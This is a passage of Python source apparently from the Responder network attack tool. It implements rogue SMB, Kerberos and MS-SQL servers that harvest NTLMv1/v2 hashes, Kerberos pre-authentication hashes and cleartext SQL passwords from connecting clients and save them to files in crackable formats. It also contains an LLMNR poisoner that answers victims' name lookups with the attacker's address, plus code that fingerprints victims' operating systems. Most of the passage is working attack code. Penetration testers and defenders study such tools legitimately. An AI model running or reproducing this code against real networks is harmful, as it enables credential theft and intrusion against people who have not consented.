    if test[7] == "NT LM 0.12":
       return "\x07\x00"
    if test[8] == "NT LM 0.12":
       return "\x08\x00"
    if test[9] == "NT LM 0.12":
       return "\x09\x00"
    if test[10] == "NT LM 0.12":
       return "\x0a\x00"

def ParseShare(data):
    packet = data[:]
    a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
    if a:
       quote = "Share requested: "+a.group(0)
       logging.warning(quote.replace('\x00',''))

#Parse SMB NTLMSSP v1/v2 
def ParseSMBHash(data,client):
    SecBlobLen = struct.unpack('<H',data[51:53])[0]
    BccLen = struct.unpack('<H',data[61:63])[0]
    if SecBlobLen < 220:
       SSPIStart = data[75:]
       LMhashLen = struct.unpack('<H',data[89:91])[0]
       LMhashOffset = struct.unpack('<H',data[91:93])[0]
       LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
       NthashLen = struct.unpack('<H',data[97:99])[0]
       NthashOffset = struct.unpack('<H',data[99:101])[0]

    if SecBlobLen > 220:
       SSPIStart = data[79:]
       LMhashLen = struct.unpack('<H',data[93:95])[0]
       LMhashOffset = struct.unpack('<H',data[95:97])[0]
       LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
       NthashLen = struct.unpack('<H',data[101:103])[0]
       NthashOffset = struct.unpack('<H',data[103:105])[0]

    if NthashLen == 24:
       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[105:107])[0]
       DomainOffset = struct.unpack('<H',data[107:109])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       UserLen = struct.unpack('<H',data[113:115])[0]
       UserOffset = struct.unpack('<H',data[115:117])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
       outfile = os.path.join(ResponderPATH,"SMB-NTLMv1ESS-Client-"+client+".txt")
       if PrintData(outfile,User+"::"+Domain):
          print "[+]SMB-NTLMv1 hash captured from : ",client
          print "[+]SMB complete hash is :", writehash
          WriteData(outfile,writehash,User+"::"+Domain)
       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))

    if NthashLen > 60:
       outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[109:111])[0]
       DomainOffset = struct.unpack('<H',data[111:113])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       UserLen = struct.unpack('<H',data[117:119])[0]
       UserOffset = struct.unpack('<H',data[119:121])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
       if PrintData(outfile,User+"::"+Domain):
          print "[+]SMB-NTLMv2 hash captured from : ",client
          print "[+]SMB complete hash is :", writehash
          WriteData(outfile,writehash,User+"::"+Domain)
       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))

#Parse SMB NTLMv1/v2 
def ParseLMNTHash(data,client):
  try:
    lenght = struct.unpack('<H',data[43:45])[0]
    LMhashLen = struct.unpack('<H',data[51:53])[0]
    NthashLen = struct.unpack('<H',data[53:55])[0]
    Bcc = struct.unpack('<H',data[63:65])[0]
    if NthashLen > 25:
       Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
       logging.warning('[+]SMB-NTLMv2 hash captured from :%s'%(client))
       outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
       Username, Domain = tuple(var)
       Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
       if PrintData(outfile,Username+"::"+Domain):
          print "[+]SMB-NTLMv2 hash captured from :",client
          print "[+]SMB-NTLMv2 complete hash is :",Writehash
          ParseShare(data)
          WriteData(outfile,Writehash, Username+"::"+Domain)
       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
    if NthashLen == 24:
       logging.warning('[+]SMB-NTLMv1 hash captured from :%s'%(client))
       outfile = os.path.join(ResponderPATH,"SMB-NTLMv1-Client-"+client+".txt")
       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
       Username, Domain = tuple(var)
       writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
       if PrintData(outfile,Username+"::"+Domain):
          print "[+]SMB-NTLMv1 hash captured from : ",client
          print "[+]SMB complete hash is :", writehash
          ParseShare(data)
          WriteData(outfile,writehash, Username+"::"+Domain)
       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
       logging.warning('[+]SMB-NTLMv1 Username:%s'%(Username))
       logging.warning('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
  except Exception:
           raise

def IsNT4ClearTxt(data):
    HeadLen = 36 
    Flag2 = data[14:16]
    if Flag2 == "\x03\x80":
       SmbData = data[HeadLen+14:]
       WordCount = data[HeadLen]
       ChainedCmdOffset = data[HeadLen+1] 
       if ChainedCmdOffset == "\x75":
          PassLen = struct.unpack('<H',data[HeadLen+15:HeadLen+17])[0]
          if PassLen > 2:
             Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
             User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
             print "[SMB]Clear Text Credentials: %s:%s" %(User,Password) 
             logging.warning("[SMB]Clear Text Credentials: %s:%s"%(User,Password))

#SMB Server class, NTLMSSP
class SMB1(BaseRequestHandler):

    def handle(self):
        try:
           while True:
              data = self.request.recv(1024)
              self.request.settimeout(1)
              ##session request 139
              if data[0] == "\x81":
                buffer0 = "\x82\x00\x00\x00"         
                self.request.send(buffer0)
                data = self.request.recv(1024)
             ##Negotiate proto answer.
              if data[8:10] == "\x72\x00":
                #Customize SMB answer.
                head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
                t = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
                t.calculate()
                final = t 
                packet0 = str(head)+str(final)
                buffer0 = longueur(packet0)+packet0  
                self.request.send(buffer0)
                data = self.request.recv(1024)
                ##Session Setup AndX Request
              if data[8:10] == "\x73\x00":
                 IsNT4ClearTxt(data)
                 head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
                 t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
                 t.calculate()
                 final = t 
                 packet1 = str(head)+str(final)
                 buffer1 = longueur(packet1)+packet1  
                 self.request.send(buffer1)
                 data = self.request.recv(4096)
                 if data[8:10] == "\x73\x00":
                    if Is_Anonymous(data):
                       head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
                       final = SMBSessEmpty()
                       packet1 = str(head)+str(final)
                       buffer1 = longueur(packet1)+packet1  
                       self.request.send(buffer1)
                    else:
                       ParseSMBHash(data,self.client_address[0])
                       head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                       final = SMBSession2Accept()
                       final.calculate()
                       packet2 = str(head)+str(final)
                       buffer2 = longueur(packet2)+packet2  
                       self.request.send(buffer2)
                       data = self.request.recv(1024)
             ##Tree Connect IPC Answer
              if data[8:10] == "\x75\x00":
                ParseShare(data)
                head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(data), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
                t = SMBTreeData()
                t.calculate()
                final = t 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##Tree Disconnect.
              if data[8:10] == "\x71\x00":
                head = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##NT_CREATE Access Denied.
              if data[8:10] == "\xa2\x00":
                head = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##Trans2 Access Denied.
              if data[8:10] == "\x25\x00":
                head = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##LogOff.
              if data[8:10] == "\x74\x00":
                head = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x02\xff\x00\x27\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)

        except Exception:
           pass #no need to print errors..

#SMB Server class, old version.
class SMB1LM(BaseRequestHandler):

    def handle(self):
        try:
           self.request.settimeout(0.5)
           data = self.request.recv(1024)
           ##session request 139
           if data[0] == "\x81":
              buffer0 = "\x82\x00\x00\x00"         
              self.request.send(buffer0)
              data = self.request.recv(1024)
              ##Negotiate proto answer.
           if data[8:10] == "\x72\x00":
              head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(data),mid=midcalc(data))
              t = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=Challenge)
              t.calculate()
              packet1 = str(head)+str(t)
              buffer1 = longueur(packet1)+packet1  
              self.request.send(buffer1)
              data = self.request.recv(1024)
              ##Session Setup AndX Request
           if data[8:10] == "\x73\x00":
              if Is_LMNT_Anonymous(data):
                 head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                 packet1 = str(head)+str(SMBSessEmpty())
                 buffer1 = longueur(packet1)+packet1  
                 self.request.send(buffer1)
              else:
                 ParseLMNTHash(data,self.client_address[0])
                 head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                 packet1 = str(head)+str(SMBSessEmpty())
                 buffer1 = longueur(packet1)+packet1  
                 self.request.send(buffer1)
                 data = self.request.recv(1024)

        except Exception:
           self.request.close()
           pass


##################################################################################
#Kerberos Server
##################################################################################
def ParseMSKerbv5TCP(Data):
   MsgType = Data[21:22]
   EncType = Data[43:44]
   MessageType = Data[32:33]
   if MsgType == "\x0a" and EncType == "\x17" and MessageType =="\x02":
      if Data[49:53] == "\xa2\x36\x04\x34" or Data[49:53] == "\xa2\x35\x04\x33":
         HashLen = struct.unpack('<b',Data[50:51])[0]
         if HashLen == 54:
            Hash = Data[53:105]
            SwitchHash = Hash[16:]+Hash[0:16]
            NameLen = struct.unpack('<b',Data[153:154])[0]
            Name = Data[154:154+NameLen]
            DomainLen = struct.unpack('<b',Data[154+NameLen+3:154+NameLen+4])[0]
            Domain = Data[154+NameLen+4:154+NameLen+4+DomainLen]
            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
            return BuildHash
      if Data[44:48] == "\xa2\x36\x04\x34" or Data[44:48] == "\xa2\x35\x04\x33":
         HashLen = struct.unpack('<b',Data[45:46])[0]
         if HashLen == 53:
            Hash = Data[48:99]
            SwitchHash = Hash[16:]+Hash[0:16]
            NameLen = struct.unpack('<b',Data[147:148])[0]
            Name = Data[148:148+NameLen]
            DomainLen = struct.unpack('<b',Data[148+NameLen+3:148+NameLen+4])[0]
            Domain = Data[148+NameLen+4:148+NameLen+4+DomainLen]
            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
            return BuildHash
         if HashLen == 54:
            Hash = Data[53:105]
            SwitchHash = Hash[16:]+Hash[0:16]
            NameLen = struct.unpack('<b',Data[148:149])[0]
            Name = Data[149:149+NameLen]
            DomainLen = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
            Domain = Data[149+NameLen+4:149+NameLen+4+DomainLen]
            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
            return BuildHash

      else:
         Hash = Data[48:100]
         SwitchHash = Hash[16:]+Hash[0:16]
         NameLen = struct.unpack('<b',Data[148:149])[0]
         Name = Data[149:149+NameLen]
         DomainLen = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
         Domain = Data[149+NameLen+4:149+NameLen+4+DomainLen]
         BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
         return BuildHash
   else:
      return False

def ParseMSKerbv5UDP(Data):
   MsgType = Data[17:18]
   EncType = Data[39:40]
   if MsgType == "\x0a" and EncType == "\x17":
      if Data[40:44] == "\xa2\x36\x04\x34" or Data[40:44] == "\xa2\x35\x04\x33":
         HashLen = struct.unpack('<b',Data[41:42])[0]
         if HashLen == 54:
            Hash = Data[44:96]
            SwitchHash = Hash[16:]+Hash[0:16]
            NameLen = struct.unpack('<b',Data[144:145])[0]
            Name = Data[145:145+NameLen]
            DomainLen = struct.unpack('<b',Data[145+NameLen+3:145+NameLen+4])[0]
            Domain = Data[145+NameLen+4:145+NameLen+4+DomainLen]
            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
            return BuildHash
         if HashLen == 53:
            Hash = Data[44:95]
            SwitchHash = Hash[16:]+Hash[0:16]
            NameLen = struct.unpack('<b',Data[143:144])[0]
            Name = Data[144:144+NameLen]
            DomainLen = struct.unpack('<b',Data[144+NameLen+3:144+NameLen+4])[0]
            Domain = Data[144+NameLen+4:144+NameLen+4+DomainLen]
            BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
            return BuildHash


      else:
         Hash = Data[49:101]
         SwitchHash = Hash[16:]+Hash[0:16]
         NameLen = struct.unpack('<b',Data[149:150])[0]
         Name = Data[150:150+NameLen]
         DomainLen = struct.unpack('<b',Data[150+NameLen+3:150+NameLen+4])[0]
         Domain = Data[150+NameLen+4:150+NameLen+4+DomainLen]
         BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
         return BuildHash
   else:
      return False

class KerbTCP(BaseRequestHandler):

    def handle(self):
        try:
           data = self.request.recv(1024)
           KerbHash = ParseMSKerbv5TCP(data)
           if KerbHash:
              Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
              if PrintData(Outfile,KerbHash):
                 print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
                 print "[+]MSKerbv5 complete hash is :", KerbHash
                 Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
                 WriteData(Outfile,KerbHash, KerbHash)
                 logging.warning('[+]MSKerbv5 complete hash is :%s'%(KerbHash)) 
        except Exception:
           raise

class KerbUDP(BaseRequestHandler):

    def handle(self):
        try:
           data, soc = self.request
           KerbHash = ParseMSKerbv5UDP(data)
           if KerbHash:
              Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
              if PrintData(Outfile,KerbHash):
                 print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
                 print "[+]MSKerbv5 complete hash is :", KerbHash
                 Outfile = os.path.join(ResponderPATH,"MSKerberos-Client-"+self.client_address[0]+".txt")
                 WriteData(Outfile,KerbHash, KerbHash)
                 logging.warning('[+]MSKerbv5 complete hash is :%s'%(KerbHash)) 
        except Exception:
           raise

##################################################################################
#SQL Stuff
##################################################################################
from SQLPackets import *

#This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
def ParseSQLHash(data,client):
    SSPIStart = data[8:]
    LMhashLen = struct.unpack('<H',data[20:22])[0]
    LMhashOffset = struct.unpack('<H',data[24:26])[0]
    LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[30:32])[0]
    if NthashLen == 24:
       NthashOffset = struct.unpack('<H',data[32:34])[0]
       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[36:38])[0]
       DomainOffset = struct.unpack('<H',data[40:42])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       UserLen = struct.unpack('<H',data[44:46])[0]
       UserOffset = struct.unpack('<H',data[48:50])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv1-Client-"+client+".txt")
       if PrintData(outfile,User+"::"+Domain):
          print "[+]MSSQL NTLMv1 hash captured from :",client
          print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
          WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
       logging.warning('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
       logging.warning('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
       logging.warning('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
       logging.warning('[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
    if NthashLen > 60:
       DomainLen = struct.unpack('<H',data[36:38])[0]
       NthashOffset = struct.unpack('<H',data[32:34])[0]
       NthashLen = struct.unpack('<H',data[30:32])[0]
       Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainOffset = struct.unpack('<H',data[40:42])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       UserLen = struct.unpack('<H',data[44:46])[0]
       UserOffset = struct.unpack('<H',data[48:50])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv2-Client-"+client+".txt")
       Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
       if PrintData(outfile,User+"::"+Domain):
          print "[+]MSSQL NTLMv2 Hash captured from :",client
          print "[+]MSSQL NTLMv2 Complete Hash is : ", Writehash
          WriteData(outfile,Writehash,User+"::"+Domain)
       logging.warning('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
       logging.warning('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
       logging.warning('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
       logging.warning('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))

def ParseSqlClearTxtPwd(Pwd):
    Pwd = map(ord,Pwd.replace('\xa5',''))
    Pw = []
    for x in Pwd:
       Pw.append(hex(x ^ 0xa5)[::-1][:2].replace("x","0").decode('hex'))
    return ''.join(Pw)

def ParseClearTextSQLPass(Data,client):
    outfile = os.path.join(ResponderPATH,"MSSQL-PlainText-Password-"+client+".txt")
    UsernameOffset = struct.unpack('<h',Data[48:50])[0]
    PwdOffset = struct.unpack('<h',Data[52:54])[0]
    AppOffset = struct.unpack('<h',Data[56:58])[0]
    PwdLen = AppOffset-PwdOffset
    UsernameLen = PwdOffset-UsernameOffset
    PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
    UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
    if PrintData(outfile,UserName+":"+PwdStr):
       print "[+]MSSQL PlainText Password captured from :",client
       print "[+]MSSQL Username: %s Password: %s"%(UserName, PwdStr)
       WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
    logging.warning('[+]MSSQL PlainText Password captured from :%s'%(client))
    logging.warning('[+]MSSQL Username: %s Password: %s'%(UserName, PwdStr))


def ParsePreLoginEncValue(Data):
    PacketLen = struct.unpack('>H',Data[2:4])[0]
    EncryptionValue = Data[PacketLen-7:PacketLen-6]
    if re.search("NTLMSSP",Data):
       return True
    else:
       return False

#MS-SQL server class.
class MSSQL(BaseRequestHandler):

    def handle(self):
        try:
           while True:
              data = self.request.recv(1024)
              self.request.settimeout(0.1)
              ##Pre-Login Message
              if data[0] == "\x12":
                 buffer0 = str(MSSQLPreLoginAnswer())        
                 self.request.send(buffer0)
                 data = self.request.recv(1024)
             ##NegoSSP
              if data[0] == "\x10":
                if re.search("NTLMSSP",data):
                   t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
                   t.calculate()
                   buffer1 = str(t) 
                   self.request.send(buffer1)
                   data = self.request.recv(1024)
                else:
                   ParseClearTextSQLPass(data,self.client_address[0])
                ##NegoSSP Auth
              if data[0] == "\x11":
                 ParseSQLHash(data,self.client_address[0])
        except Exception:
           pass
           self.request.close()

##################################################################################
#LLMNR Stuff
##################################################################################

#LLMNR Answer packet.
class LLMNRAns(Packet):
    fields = OrderedDict([
        ("Tid",              ""),
        ("Flags",            "\x80\x00"),
        ("Question",         "\x00\x01"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),
        ("QuestionNameLen",  "\x09"),
        ("QuestionName",     ""),
        ("QuestionNameNull", "\x00"),
        ("Type",             "\x00\x01"),
        ("Class",            "\x00\x01"),
        ("AnswerNameLen",    "\x09"),  
        ("AnswerName",       ""),
        ("AnswerNameNull",   "\x00"),    
        ("Type1",            "\x00\x01"),  
        ("Class1",           "\x00\x01"),
        ("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self):
        self.fields["IP"] = inet_aton(OURIP)
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
        self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
        self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]

def Parse_LLMNR_Name(data):
   NameLen = struct.unpack('>B',data[12])[0]
   Name = data[13:13+NameLen]
   return Name

def Parse_IPV6_Addr(data):
    if data[len(data)-4:len(data)][1] =="\x1c":
       return False
    if data[len(data)-4:len(data)] == "\x00\x01\x00\x01":
       return True
    if data[len(data)-4:len(data)] == "\x00\xff\x00\x01":
       return True
    else:
       return False

def IsOnTheSameSubnet(ip, net):
   net = net+'/24'
   ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
   netstr, bits = net.split('/')
   netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
   mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
   return (ipaddr & mask) == (netaddr & mask)

def IsICMPRedirectPlausible(IP):
    dnsip = []
    for line in file('/etc/resolv.conf', 'r'):
        ip = line.split()
        if ip[0] == 'nameserver':
           dnsip.extend(ip[1:])
    for x in dnsip:
        if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
           print "[Analyze mode: ICMP] You can ICMP Redirect on this network. This workstation (%s) is not on the same subnet than the DNS server (%s). Use python Icmp-Redirect.py for more details."%(IP, x) 
        else:
           pass

def FindLocalIP(Iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, 25, Iface+'\0')
    s.connect(("127.0.0.1",9))#RFC 863
    return s.getsockname()[0]

def AnalyzeICMPRedirect():
    if Analyze(AnalyzeMode) and OURIP is not None and INTERFACE == 'Not set':
       IsICMPRedirectPlausible(OURIP)
    if Analyze(AnalyzeMode) and INTERFACE != 'Not set':
       IsICMPRedirectPlausible(FindLocalIP(INTERFACE))

AnalyzeICMPRedirect()

# LLMNR Server class.
class LLMNR(BaseRequestHandler):

    def handle(self):
        data, soc = self.request
        try:
            if Analyze(AnalyzeMode):
               if data[2:4] == "\x00\x00":
                  if Parse_IPV6_Addr(data):
                      Name = Parse_LLMNR_Name(data)
                      if Is_Finger_On(Finger_On_Off):
                         try:
                            Finger = RunSmbFinger((self.client_address[0],445))
                            Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,Finger[0],Finger[1])
                            logger3.warning(Message)
                         except Exception:
                            Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
                            logger3.warning(Message)
                         if PrintLLMNRNBTNS(AnalyzeFilename,Message):
                            print Message
                      else:
                         Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
                         if PrintLLMNRNBTNS(AnalyzeFilename,Message):
                            print Message
                         logger3.warning(Message)

            if RespondToSpecificHost(RespondTo):
               if Analyze(AnalyzeMode) == False:
                  if RespondToIPScope(RespondTo, self.client_address[0]):
                     if data[2:4] == "\x00\x00":
                        if Parse_IPV6_Addr(data):
                           Name = Parse_LLMNR_Name(data)
                           if RespondToSpecificName(RespondToName) == False:
                              buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                              buff.calculate()
                              for x in range(1):
                                 soc.sendto(str(buff), self.client_address)
                              Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                              logging.warning(Message)
                              if PrintLLMNRNBTNS(Log2Filename,Message):
                                 print Message
                                 logger2.warning(Message)
                              if Is_Finger_On(Finger_On_Off):
                                 try:
                                    Finger = RunSmbFinger((self.client_address[0],445))
                                    print '[+] OsVersion is:%s'%(Finger[0])
                                    print '[+] ClientVersion is :%s'%(Finger[1])
                                    logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                                    logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                                 except Exception:
                                    logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                    pass

                           if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                              buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                              buff.calculate()
                              for x in range(1):
                                 soc.sendto(str(buff), self.client_address)
                              Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                              logging.warning(Message)
                              if PrintLLMNRNBTNS(Log2Filename,Message):
                                 print Message
                                 logger2.warning(Message)
                              if Is_Finger_On(Finger_On_Off):
                                 try:
                                    Finger = RunSmbFinger((self.client_address[0],445))
                                    print '[+] OsVersion is:%s'%(Finger[0])
                                    print '[+] ClientVersion is :%s'%(Finger[1])
                                    logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                                    logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                                 except Exception:
                                    logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                    pass
                     else:
                        pass

            if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
               if data[2:4] == "\x00\x00":
                     if Parse_IPV6_Addr(data):
                        Name = Parse_LLMNR_Name(data)
                        if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                           buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                           buff.calculate()
                           Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                           for x in range(1):
                              soc.sendto(str(buff), self.client_address)
                           if PrintLLMNRNBTNS(Log2Filename,Message):
                              print Message
                              logger2.warning(Message)
                           if Is_Finger_On(Finger_On_Off):
                              try:
                                 Finger = RunSmbFinger((self.client_address[0],445))
                                 print '[+] OsVersion is:%s'%(Finger[0])
                                 print '[+] ClientVersion is :%s'%(Finger[1])
                                 logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                                 logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                              except Exception:
                                 logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                 pass
                        if RespondToSpecificName(RespondToName) == False:
